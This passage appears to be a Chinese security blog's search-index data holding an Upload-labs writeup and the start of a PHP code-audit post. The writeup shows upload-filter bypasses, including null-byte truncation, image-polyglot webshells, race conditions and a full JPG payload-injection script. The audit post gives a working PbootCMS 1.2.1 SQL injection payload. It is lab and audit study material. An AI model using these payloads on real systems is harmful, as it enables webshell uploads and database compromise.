&#x5728;&#x4FDD;&#x5B58;&#x7684;&#x8DEF;&#x5F84;&#x5904;&#xFF0C;&#x5C06;../upload/&#x6539;&#x4E3A;&#xFF1A;../upload/evil.php(&#x6CE8;&#x610F;&#x8FD9;&#x91CC;&#x6709;&#x4E2A;&#x7A7A;&#x683C;) &#x4F7F;&#x7528;Brupsuite&#x7684;Hex&#xFF0C;&#x5C06;&#x5BF9;&#x5E94;&#x7A7A;&#x683C;&#x5904;&#x7684;20&#x6539;&#x4E3A;00 &#x4E0A;&#x4F20; Pass-13&#x8FD9;&#x4E00;&#x5173;&#x7684;&#x4EFB;&#x52A1;&#x597D;&#x50CF;&#x589E;&#x52A0;&#x4E86;&#x5440;&#xFF0C;&#x8981;.jpg,.png,.gif&#x90FD;&#x4E0A;&#x4F20;&#x6210;&#x529F;&#x624D;&#x7B97;&#x8FC7;&#x5173;&#x3002; GIF&#x56FE;&#x7247;&#x683C;&#x5F0F;&#x6700;&#x7B80;&#x5355;&#xFF1A;GIF89a&lt;?php phpinfo(); ?&gt; .gif&#x540E;&#x7F00;&#x4E0A;&#x4F20;&#x5373;&#x53EF; JPG&#xFF1A; &#x51C6;&#x5907;&#x4E00;&#x4E2A;&#x4E00;&#x53E5;&#x8BDD;&#xFF0C;&#x4E00;&#x4E2A;jpg&#x56FE;&#x7247; &#x4F7F;&#x7528;&#xFF1A;copy 1.jpg /b + 2.php /a evil.jpg&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x5E26;&#x6709;&#x4E00;&#x53E5;&#x8BDD;&#x7684;jpg PNG&#xFF1A;&#x548C;JPG&#x4E00;&#x6837;&#x7684;&#x64CD;&#x4F5C; Pass-14&#x63D0;&#x793A;&#xFF1A;&#x672C;pass&#x4F7F;&#x7528;getimagesize()&#x68C0;&#x67E5;&#x662F;&#x5426;&#x4E3A;&#x56FE;&#x7247;&#x6587;&#x4EF6;&#xFF01; &#x548C;13&#x5173;&#x662F;&#x4E00;&#x6837;&#x7684;&#x3002; Pass-15&#x63D0;&#x793A;&#xFF1A;&#x672C;pass&#x4F7F;&#x7528;exif_imagetype()&#x68C0;&#x67E5;&#x662F;&#x5426;&#x4E3A;&#x56FE;&#x7247;&#x6587;&#x4EF6;&#xFF01; &#x548C;13&#x5173;&#x662F;&#x4E00;&#x6837;&#x7684;&#x3002; Pass-16&#x63D0;&#x793A;&#xFF1A;&#x672C;pass&#x91CD;&#x65B0;&#x6E32;&#x67D3;&#x4E86;&#x56FE;&#x7247;&#xFF01; &#x8FD9;&#x91CC;&#x5C31;&#x662F;DDCTF&#x7B2C;&#x4E09;&#x9898;&#x7684;&#x8003;&#x70B9;&#xFF0C;&#x56FE;&#x7247;&#x7684;&#x4E8C;&#x6B21;&#x6E32;&#x67D3;&#x3002; GIF&#x7684;&#x56FE;&#x7684;&#x53C8;&#x662F;&#x6700;&#x7B80;&#x5355;&#x7684;&#xFF1A; &#x5BFB;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x6E32;&#x67D3;&#x540E;&#x6CA1;&#x6709;&#x53D1;&#x751F;&#x53D8;&#x5316;&#x7684;&#x90E8;&#x5206; &#x5C06;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x63D2;&#x5165; (&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;Brupsuite&#x6765;&#x5BF9;&#x6BD4;&#x4E24;&#x4E2A;&#x56FE;&#x7247;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x5BFB;&#x627E;&#x5230;&#x6CA1;&#x6709;&#x6539;&#x53D8;&#x7684;&#x533A;&#x57DF;) PNG&#xFF1A; &#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x7528;&#x56FD;&#x5916;&#x7684;&#x811A;&#x672C; 123456789101112131415161718192021222324&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);}imagepng($img,&apos;./1.png&apos;);?&gt; &#x7528;php&#x8FD0;&#x884C;&#x540E;&#x5F97;&#x5230;1.png&#x4E0A;&#x4F20;&#x5373;&#x53EF;&#x3002; JPG&#xFF1A; JPG&#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x56FD;&#x5916;&#x7684;&#x811A;&#x672C;&#x751F;&#x6210; &#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#xFF1A; &#x5148;&#x5C06;JPG&#x56FE;&#x7247;&#x4E0A;&#x4F20;&#x6E32;&#x67D3;&#x4E00;&#x6B21; &#x4E0B;&#x8F7D;&#x4E0B;&#x6765;&#xFF0C;&#x4F7F;&#x7528;&#x811A;&#x672C;&#xFF1A;php xuanran.php 1.jpg &#x5F97;&#x5230;pyload&#x56FE;&#x7247;&#x518D;&#x4E0A;&#x4F20; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169&lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs &quot;Something&apos;s wrong&quot;. If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;; if(!extension_loaded(&apos;gd&apos;) || !function_exists(&apos;imagecreatefromjpeg&apos;)) { die(&apos;php-gd is not installed&apos;); } if(!isset($argv[1])) { die(&apos;php jpg_payload.php &lt;jpg_name.jpg&gt;&apos;); } set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) { die(&apos;Incorrect SOI marker&apos;); } while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) { $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) { $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&apos;_&apos;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-&gt;eof())) { if($dis-&gt;readByte() === 0xFF) { if($dis-&gt;readByte !== 0x00) { break; } } } $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage(&apos;payload_&apos;.$argv[1], $outStream)) { die(&apos;Success!&apos;); } else { break; } } } } unlink(&apos;payload_&apos;.$argv[1]); die(&apos;Something\\&apos;s wrong&apos;); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&apos;/(\\d+) extraneous bytes before marker/&apos;, $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-&gt;binData = &apos;&apos;; $this-&gt;order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die(&apos;File not exists [&apos;.$filename.&apos;]&apos;); $this-&gt;binData = file_get_contents($filename); } else { $this-&gt;binData = $filename; } $this-&gt;size = strlen($this-&gt;binData); } public function seek() { return ($this-&gt;size - strlen($this-&gt;binData)); } public function skip($skip) { $this-&gt;binData = substr($this-&gt;binData, $skip); } public function readByte() { if($this-&gt;eof()) { die(&apos;End Of File&apos;); } $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); } public function readShort() { if(strlen($this-&gt;binData) &lt; 2) { die(&apos;End Of File&apos;); } $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) { $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); } else { $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); } return $short; } public function eof() { return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); } }?&gt; Pass-17&#x63D0;&#x793A;&#x9700;&#x8981;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#xFF1A; &#x67E5;&#x770B;&#x6E90;&#x7801;&#x3002; &#x8FD9;&#x91CC;&#x5148;&#x4F1A;&#x628A;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF0C;&#x4E0A;&#x4F20;&#x6210;&#x529F;&#x4E4B;&#x540E;&#x5F00;&#x59CB;&#x5224;&#x65AD;&#x540E;&#x7F00;&#xFF0C;&#x5982;&#x679C;&#x540E;&#x7F00;&#x4E0D;&#x5408;&#x6CD5;&#xFF0C;&#x5219;&#x5220;&#x9664;&#x6587;&#x4EF6;&#x3002;&#x5408;&#x6CD5;&#x7684;&#x8BDD;&#x5C31;&#x66F4;&#x6539;&#x540D;&#x79F0;&#x3002; &#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x7684;&#x65B9;&#x6CD5;&#x662F;&#x6761;&#x4EF6;&#x7ADE;&#x4E89;&#x5220;&#x9664;&#x65F6;&#x95F4;&#x5DEE;&#x7ED5;&#x8FC7;&#xFF0C;&#x5728;&#x6587;&#x4EF6;&#x8FD8;&#x6CA1;&#x88AB;&#x5220;&#x9664;&#x7684;&#x65F6;&#x5019;&#x8BBF;&#x95EE;&#x5230;evil.php &#x4E0A;&#x4F20;evil.php&#x6587;&#x4EF6; &#x7528;Brupsuite&#x6293;&#x5305; &#x7528;Brupsuite&#x7684;&#x6D4B;&#x8BD5;&#x5668;&#xFF0C;&#x5C06;&#x7EBF;&#x7A0B;&#x6570;&#x8C03;&#x6574;&#x5230;20&#x4EE5;&#x4E0A;&#xFF0C;&#x63D0;&#x4EA4;&#x6570;&#x636E;&#x5305; &#x8BBF;&#x95EE;evil.php Pass-18&#x8FD9;&#x4E00;&#x5173;&#x9700;&#x8981;&#x5229;&#x7528;&#x4E0A;&#x4F20;&#x91CD;&#x547D;&#x540D;&#x7ADE;&#x4E89;+Apache&#x89E3;&#x6790;&#x6F0F;&#x6D1E;&#x3002; &#x548C;&#x7B2C;17&#x5173;&#x4E00;&#x6837;&#xFF0C;&#x5148;&#x4E0A;&#x4F20;&#xFF0C;&#x540E;&#x5224;&#x65AD;&#xFF0C;&#x5E76;&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x540D;&#x3002; &#x4E0A;&#x4F20;evil.php.7Z&#x6587;&#x4EF6; &#x7528;Brupsuite&#x6293;&#x5305; &#x7528;Brupsuite&#x7684;&#x6D4B;&#x8BD5;&#x5668;&#xFF0C;&#x5C06;&#x7EBF;&#x7A0B;&#x6570;&#x8C03;&#x6574;&#x5230;20&#x4EE5;&#x4E0A;&#xFF0C;&#x63D0;&#x4EA4;&#x6570;&#x636E;&#x5305; &#x6210;&#x529F;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x63D0;&#x793A;&#xFF1A;&#x6587;&#x4EF6;&#x5DF2;&#x7ECF;&#x88AB;&#x4E0A;&#x4F20;&#xFF0C;&#x4F46;&#x6CA1;&#x6709;&#x91CD;&#x547D;&#x540D;&#x3002; &#x53EF;&#x80FD;&#x662F;&#x8FD9;&#x4E2A;lab&#x7684;&#x6E90;&#x7801;&#x6709;&#x95EE;&#x9898;&#xFF0C;&#x76F4;&#x63A5;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x540D;&#x4F1A;&#x5BFC;&#x81F4;&#x6587;&#x4EF6;&#x540D;&#x53D8;&#x4E3A;&#x201D;uploadevil.php.7Z&#x201D; &#x5C06;&#x6587;&#x4EF6;&#x540D;&#x6539;&#x4E3A;&#x201D;/evil.php.7Z&#x201D;&#x4E0A;&#x4F20;&#x5373;&#x53EF; &#x6210;&#x529F;&#x4E4B;&#x540E;&#x8BBF;&#x95EE;&#x201D;evil.php.7Z&#x201D;&#x3002; Pass-19&#x548C;12&#x5173;&#x4E00;&#x6837;&#x7684;&#x89E3;&#x6CD5;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x901A;&#x8FC7;$_POST&#x65B9;&#x6CD5;&#x6765;&#x83B7;&#x53D6;&#x6587;&#x4EF6;&#x540D;&#x3002; &#x5C06;evil.php&#x6539;&#x4E3A;&#xFF1A;evil.php 1.jpg(&#x6CE8;&#x610F;&#x8FD9;&#x91CC;&#x6709;&#x4E2A;&#x7A7A;&#x683C;) &#x4F7F;&#x7528;Brupsuite&#x7684;Hex&#xFF0C;&#x5C06;&#x5BF9;&#x5E94;&#x7A7A;&#x683C;&#x5904;&#x7684;20&#x6539;&#x4E3A;00 &#x4E0A;&#x4F20; &#x5C31;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x3002; Pass-20123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES[&apos;upload_file&apos;])){ //&#x68C0;&#x67E5;MIME $allow_type = array(&apos;image/jpeg&apos;,&apos;image/png&apos;,&apos;image/gif&apos;); if(!in_array($_FILES[&apos;upload_file&apos;][&apos;type&apos;],$allow_type)){ $msg = &quot;&#x7981;&#x6B62;&#x4E0A;&#x4F20;&#x8BE5;&#x7C7B;&#x578B;&#x6587;&#x4EF6;!&quot;; }else{ //&#x68C0;&#x67E5;&#x6587;&#x4EF6;&#x540D; $file = empty($_POST[&apos;save_name&apos;]) ? $_FILES[&apos;upload_file&apos;][&apos;name&apos;] : $_POST[&apos;save_name&apos;];//&#x5224;&#x65AD;save_name&#x662F;&#x5426;&#x88AB;&#x5B9A;&#x4E49;&#xFF0C;&#x5B9A;&#x4E49;&#x7684;&#x8BDD;&#x5C31;&#x7528;save_name if (!is_array($file)) {//&#x8FD9;&#x91CC;&#x5224;&#x65AD;&#x4E86;file&#x662F;&#x5426;&#x4E3A;&#x6570;&#x7EC4; $file = explode(&apos;.&apos;, strtolower($file));//&#x5C06;&#x6587;&#x4EF6;&#x540D;&#x6309;.&#x5206;&#x5272;&#x5F00; } $ext = end($file);//&#x53D6;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#xFF0C;&#x5373;&#x6587;&#x4EF6;&#x7684;&#x540E;&#x7F00;&#x540D; $allow_suffix = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;); if (!in_array($ext, $allow_suffix)) { $msg = &quot;&#x7981;&#x6B62;&#x4E0A;&#x4F20;&#x8BE5;&#x540E;&#x7F00;&#x6587;&#x4EF6;!&quot;; }else{ $file_name = reset($file) . &apos;.&apos; . $file[count($file) - 1];//&#x8F93;&#x51FA;&#x7B2C;&#x4E00;&#x4E2A;&#x503C;&#x52A0;&#x4E2A;&#x70B9;&#xFF0C;&#x518D;&#x8BFB;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x3002; $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = UPLOAD_PATH . &apos;/&apos; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = &quot;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x6210;&#x529F;&#xFF01;&quot;; $is_upload = true; } else { $msg = &quot;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x5931;&#x8D25;&#xFF01;&quot;; } } }}else{ $msg = &quot;&#x8BF7;&#x9009;&#x62E9;&#x8981;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#xFF01;&quot;;} &#x6E90;&#x7801;&#x8FDB;&#x884C;&#x4E86;&#x4EE5;&#x4E0B;&#x4E8B;&#x60C5;&#xFF1A; &#x68C0;&#x67E5;MIME &#x68C0;&#x67E5;&#x540E;&#x7F00;&#x540D;(&#x8FD9;&#x91CC;&#x5168;&#x90E8;&#x5316;&#x4E3A;&#x4E86;&#x5C0F;&#x5199;) &#x90FD;&#x901A;&#x8FC7;&#x4E4B;&#x540E;&#x518D;&#x4FDD;&#x5B58;&#x6587;&#x4EF6; &#x4F7F;&#x7528;&#x4EE5;&#x4E0B;POST&#x6570;&#x636E;&#x7ED5;&#x8FC7;&#xFF1A; 12345678910111213141516171819202122Content-Length: 537Connection: closeUpgrade-Insecure-Requests: 1-----------------------------46491466030493Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;phpinfo.php&quot;Content-Type: image/jpeg&lt;?php phpinfo();?&gt;-----------------------------46491466030493Content-Disposition: form-data; name=&quot;save_name[0]&quot;phpinfo.php/-----------------------------46491466030493Content-Disposition: form-data; name=&quot;save_name[2]&quot;jpg-----------------------------46491466030493Content-Disposition: form-data; name=&quot;submit&quot;&#xE4;&#xB8;&#x8A;&#xE4;&#xBC;&#xA0;-----------------------------46491466030493-- &#x5206;&#x6790;&#xFF0C;&#x7531;&#x4E8E;&#x4ED6;&#x5728;&#x524D;&#x9762;&#x52A0;&#x4E86;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#x6570;&#x7EC4;&#x7684;if&#x8BED;&#x53E5;&#xFF0C;&#x4E8E;&#x662F;&#x53EF;&#x4EE5;&#x8D4B;&#x503C;&#x7ED9;sava_name[0]&#xFF0C;&#x548C;sava_name[2]&#x7684;&#x503C;&#x5206;&#x522B;&#x4E3A;&#xFF1A;phpinfo.php/ &#x548C; jpg&#x3002; &#x6B64;&#x65F6;&#x7684;sava_name&#x7684;&#x503C;&#x4E3A;&#xFF1A; &#x8FD9;&#x6837;&#x5728;&#x6700;&#x540E;&#x7684;file_name&#x8D4B;&#x503C;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x4E3A;&#xFF1A;phpinfo.php/.jpg &#x901A;&#x8FC7;move_uploaded_file&#xFF0C;&#x6700;&#x7EC8;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x4E3A;phpinfo.php &#x603B;&#x7ED3;&#x6839;&#x636E;lab&#x63D0;&#x4F9B;&#x7684;&#x56FE;&#x7247;&#x53C8;&#x603B;&#x7ED3;&#x4E86;&#x4E00;&#x4E0B;&#x3002;","link":"/2019/04/16/Upload-labs-Writeup/"},{"title":"PHP代码审计之学习SQL注入与审计流程","text":"&#x8BF4;&#x5728;&#x524D;&#x9762;&#x672C;&#x6765;&#x53EA;&#x60F3;&#x590D;&#x73B0;&#x4E00;&#x4E0B;sql&#x6CE8;&#x5165;&#x7684;&#x51E0;&#x7BC7;&#x6587;&#x7AE0;&#xFF0C;&#x4F46;&#x5728;&#x5148;&#x77E5;&#x4E0A;&#x627E;&#x5230;&#x4E86;&#x51E0;&#x7BC7;&#x975E;&#x5E38;&#x597D;&#x7684;&#x5165;&#x95E8;&#x5BA1;&#x8BA1;&#x7684;&#x6587;&#x7AE0;&#x3002;&#x4E8E;&#x662F;&#x6253;&#x7B97;&#x6309;&#x7167;&#x4ED6;&#x7684;&#x5BA1;&#x8BA1;&#x601D;&#x8DEF;&#xFF0C;&#x719F;&#x6089;&#x4E00;&#x4E0B;PHP&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x6D41;&#x7A0B;&#xFF0C;&#x540C;&#x65F6;&#x6574;&#x7406;&#x4E00;&#x4E0B;SQL&#x6CE8;&#x5165;&#x7684;&#x5BA1;&#x8BA1;&#x65B9;&#x6CD5;&#x3002; &#x6587;&#x7AE0;&#x5730;&#x5740;&#xFF1A;https://xz.aliyun.com/t/3532 &#x8FC7;&#x7A0B;&#x4E00; &#x4E86;&#x89E3;&#x7F51;&#x7AD9;&#x7684;&#x57FA;&#x672C;&#x67B6;&#x6784;&#x6587;&#x7AE0;&#x662F;&#x62FF;PbootCMS1.2.1&#x6765;&#x505A;&#x6F14;&#x793A;&#x3002; &#x5B89;&#x88C5;&#x597D;&#x7CFB;&#x7EDF;&#xFF0C;&#x914D;&#x7F6E;&#x597D;&#x6570;&#x636E;&#x5E93;&#x4FE1;&#x606F;&#xFF0C;&#x9605;&#x8BFB;&#x4E00;&#x4E0B;&#x7F51;&#x7AD9;&#x5F00;&#x53D1;&#x624B;&#x518C;&#x3002; &#x5728;&#x5BA1;&#x8BA1;&#x4E4B;&#x524D;&#xFF0C;&#x53EF;&#x4EE5;&#x5148;&#x505A;&#x4EE5;&#x4E0B;&#x4E8B;&#x60C5;&#xFF1A; 1. &#x4E86;&#x89E3;&#x7F51;&#x7AD9;&#x76EE;&#x5F55;&#x7ED3;&#x6784; &#x4F7F;&#x7528; tree &gt; tree.txt &#x6765;&#x751F;&#x6210;&#x6587;&#x4EF6;&#x6811;&#x3002;&#x5FEB;&#x901F;&#x4E86;&#x89E3;&#x7CFB;&#x7EDF;&#x3002; 2. &#x786E;&#x5B9A;&#x8DEF;&#x7531;&#x8D70;&#x5411; &#x4E00;&#x822C;&#x662F;mvc&#x7684;&#x8DEF;&#x7531;&#xFF0C;&#x8FD9;&#x4E2A;cms&#x8FD8;&#x5305;&#x542B;&#x81EA;&#x5B9A;&#x4E49;&#x8DEF;&#x7531;&#x3002; &#x8FC7;&#x7A0B;&#x4E8C; &#x4E86;&#x89E3;&#x7CFB;&#x7EDF;&#x53C2;&#x6570;&#x4E0E;&#x5E95;&#x5C42;&#x8FC7;&#x6EE4;&#x60C5;&#x51B5;1. &#x4E86;&#x89E3;&#x7CFB;&#x7EDF;&#x53C2;&#x6570;&#x8FC7;&#x6EE4;&#x7684;&#x60C5;&#x51B5; a)&#x539F;&#x751F;GET,POST,REUQEST&#x6700;&#x7B80;&#x5355;&#x7684;&#x65B9;&#x6CD5;&#x5C31;&#x662F;&#x627E;&#x4E00;&#x4E2A;&#x7CFB;&#x7EDF;&#x4E2D;&#x5916;&#x90E8;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x4F7F;&#x7528; var_dump($_GET); var_dump($_POST); var_dump($_REQUEST); &#x6765;&#x67E5;&#x770B;&#x8FC7;&#x6EE4;&#x60C5;&#x51B5; &#x6587;&#x7AE0;&#x4F7F;&#x7528;&#x4E86;&#x4E00;&#x4E2A;&#x7559;&#x8A00;&#x65B0;&#x589E;&#x70B9;&#xFF0C;&#x6DFB;&#x52A0;&#x4E86;&#x4E0A;&#x65B9;&#x8BED;&#x53E5;&#x4E4B;&#x540E;&#x3002; &#x8BBF;&#x95EE;:/index.php/Message/add?test=&apos;&quot;;!-=$%^{()}&lt;&gt; &#x7528;&#x6B64;&#x6765;&#x68C0;&#x6D4B;&#x539F;&#x59CB;&#x6570;&#x636E;&#x7684;&#x8FC7;&#x6EE4;&#x60C5;&#x51B5; b)&#x7CFB;&#x7EDF;&#x5916;&#x90E8;&#x53D8;&#x91CF;&#x83B7;&#x53D6;&#x51FD;&#x6570; get()&#xFF0C;post()&#xFF0C;request() &#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;seay&#x641C;&#x7D22;&quot;get(&quot;&#x6765;&#x5BFB;&#x627E;&#x5230;get&#x6570;&#x636E;&#x5904;&#x7406;&#x7684;&#x51FD;&#x6570;&#x3002; 2. &#x4E86;&#x89E3;&#x6570;&#x636E;&#x5E93;&#x5E95;&#x5C42;&#x8FD0;&#x884C;&#x65B9;&#x5F0F; &#x4E86;&#x89E3;&#x6570;&#x636E;&#x5E93;&#x589E;&#x5220;&#x67E5;&#x6539;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x67E5;&#x770B;&#x662F;&#x5426;&#x6709;&#x8FC7;&#x6EE4;&#x3002; seay&#x641C;&#x7D22;&#xFF1A;insert( &#x7B49;&#x3002; SQL&#x6CE8;&#x5165;&#x5728;&#x7EBF;&#x7559;&#x8A00;&#x5904;insert sql&#x6CE8;&#x5165;&#x590D;&#x73B0;&#x6F0F;&#x6D1E;http://127.0.0.1/index.php/about/10 &#x63D0;&#x4EA4;&#x7559;&#x8A00;&#x5E76;&#x6293;&#x5305;&#x3002; &#x5C06;&#xFF1A; contacts=1&amp;mobile=2&amp;content=3&amp;checkcode=3231 &#x4FEE;&#x6539;&#x4E3A;&#xFF1A; contacts[content`,`create_time`,`update_time`) VALUES (&apos;1&apos;, &apos;1&apos; ,1 and updatexml(1,concat(0x3a,user()),1) );-- a] &#x63D0;&#x4EA4;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x53EF;&#x4EE5;&#x83B7;&#x5F97;&#x6570;&#x636E;&#x5E93;&#x7528;&#x6237;&#x540D;&#xFF1A; pic &#x4EE3;&#x7801;&#x5206;&#x6790;POST&#x63D0;&#x4EA4;&#x7684;&#x5730;&#x5740;&#x4E3A;&#xFF1A; http://127.0.0.1/index.php/Message/add &#x6839;&#x636E;&#x8DEF;&#x7531;&#xFF0C;&#x4F4D;&#x7F6E;&#x4E3A;&#xFF1A; Message&#x6A21;&#x5757;&#xFF0C;add&#x65B9;&#x6CD5;&#x3002; &#x5177;&#x4F53;&#x4F4D;&#x7F6E;&#xFF1A;apps/home/controller/MessageController.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970// &#x7559;&#x8A00;&#x65B0;&#x589E; public function add() { if ($_POST) { if (time() - session(&apos;lastsub&apos;) &lt; 10) { alert_back(&apos;&#x60A8;&#x63D0;&#x4EA4;&#x592A;&#x9891;&#x7E41;&#x4E86;&#xFF0C;&#x8BF7;&#x7A0D;&#x540E;&#x518D;&#x8BD5;&#xFF01;&apos;); } // &#x9A8C;&#x8BC1;&#x7801;&#x9A8C;&#x8BC1; $checkcode = post(&apos;checkcode&apos;); if ($this-&gt;config(&apos;message_check_code&apos;)) { if (! $checkcode) { alert_back(&apos;&#x9A8C;&#x8BC1;&#x7801;&#x4E0D;&#x80FD;&#x4E3A;&#x7A7A;&#xFF01;&apos;); } if ($checkcode != session(&apos;checkcode&apos;)) { alert_back(&apos;&#x9A8C;&#x8BC1;&#x7801;&#x9519;&#x8BEF;&#xFF01;&apos;); } } // &#x8BFB;&#x53D6;&#x5B57;&#x6BB5; if (! $form = $this-&gt;model-&gt;getFormField(1)) { alert_back(&apos;&#x7559;&#x8A00;&#x8868;&#x5355;&#x4E0D;&#x5B58;&#x5728;&#x4EFB;&#x4F55;&#x5B57;&#x6BB5;&#xFF0C;&#x8BF7;&#x6838;&#x5BF9;&#x540E;&#x91CD;&#x8BD5;&#xFF01;&apos;); } // &#x63A5;&#x6536;&#x6570;&#x636E; $mail_body = &apos;&apos;; foreach ($form as $value) { $field_data = post($value-&gt;name); if (is_array($field_data)) { // &#x5982;&#x679C;&#x662F;&#x591A;&#x9009;&#x7B49;&#x60C5;&#x51B5;&#x65F6;&#x8F6C;&#x6362; $field_data = implode(&apos;,&apos;, $field_data); } if ($value-&gt;required &amp;&amp; ! $field_data) { alert_back($value-&gt;description . &apos;&#x4E0D;&#x80FD;&#x4E3A;&#x7A7A;&#xFF01;&apos;); } else { $data[$value-&gt;name] = post($value-&gt;name); $mail_body .= $value-&gt;description . &apos;&#xFF1A;&apos; . post($value-&gt;name) . &apos;&lt;br&gt;&apos;; } } // &#x8BBE;&#x7F6E;&#x989D;&#x5916;&#x6570;&#x636E; if ($data) { $data[&apos;acode&apos;] = session(&apos;lg&apos;); $data[&apos;user_ip&apos;] = ip2long(get_user_ip()); $data[&apos;user_os&apos;] = get_user_os(); $data[&apos;user_bs&apos;] = get_user_bs(); $data[&apos;recontent&apos;] = &apos;&apos;; $data[&apos;status&apos;] = 0; $data[&apos;create_user&apos;] = &apos;guest&apos;; $data[&apos;update_user&apos;] = &apos;guest&apos;; } if ($this-&gt;model-&gt;addMessage($data)) { session(&apos;lastsub&apos;, time()); // &#x8BB0;&#x5F55;&#x6700;&#x540E;&#x63D0;&#x4EA4;&#x65F6;&#x95F4; $this-&gt;log(&apos;&#x7559;&#x8A00;&#x63D0;&#x4EA4;&#x6210;&#x529F;&#xFF01;&apos;); if ($this-&gt;config(&apos;message_send_mail&apos;) &amp;&amp; 